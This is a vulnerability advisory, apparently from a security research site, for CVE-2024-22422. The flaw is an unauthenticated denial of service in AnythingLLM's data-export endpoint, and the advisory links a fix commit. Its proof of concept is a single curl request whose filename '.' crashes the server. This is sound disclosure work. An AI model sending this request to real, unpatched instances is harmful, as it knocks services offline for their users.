{"hash":"5c715dcab9453cf7320b143ad28942faf4a555cb","data":{"post":{"title":"AnythingLLM Unhandled Exception DoS","path":"/vulnerabilities/anythingllm-path-traversal-dos/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>An API route (file export) can allow an unauthenticated attacker to crash the AnythingLLM server resulting in a denial of service attack.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/Mintplex-Labs/anything-llm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">AnythingLLM</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>No version tags. Fixed in commit <a href=\"https://github.com/Mintplex-Labs/anything-llm/commit/08d33cfd8fc47c5052b6ea29597c964a9da641e2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">08d33cf</a></p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The “data-export” endpoint is used to export files using the filename parameter as user input.</p>\n<p>The endpoint takes the user input, filters it to avoid directory traversal attacks, fetches the file from the server, and afterwards deletes it.</p>\n<p>An attacker can trick the input filter mechanism to point to the current directory, and while attempting to delete it the server will crash as there is no error-handling wrapper around it.</p>\n<p>Moreover, the endpoint is public and does not require any form of authentication, resulting in an unauthenticated Denial of Service issue, which crashes the instance using a single HTTP packet.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>As the API endpoint is unauthenticated there is only a need for a single HTTP request to crash the server:</p>\n<pre><code class=\"language-shell\">curl -i -s -k -X $'GET' \\\n-H $'Host: localhost:3001' \\\n-H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' \\\n-H $'Accept: */*' \\\n-H $'Accept-Language: en-US,en;q=0.5' \\\n-H $'Accept-Encoding: gzip, deflate' \\\n-H $'Connection: close' \\\n$'http://localhost:3001/api/system/data-exports/.'\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/Mintplex-Labs/anything-llm/security/advisories/GHSA-xmj6-g32r-fc5q\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Advisory</a></p>\n<p><a href=\"https://github.com/Mintplex-Labs/anything-llm/commit/08d33cfd8fc47c5052b6ea29597c964a9da641e2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2024-22422, HIGH, An API route (file export) can allow an unauthenticated attacker to crash the AnythingLLM server resulting in a denial of service attack.","date_published":"2024-01-22","xray_id":"","vul_id":"CVE-2024-22422","severity":"high","discovered_by":"Natan Nehorai","last_updated":"2024-01-22","cvss":7.5}},"context":{}}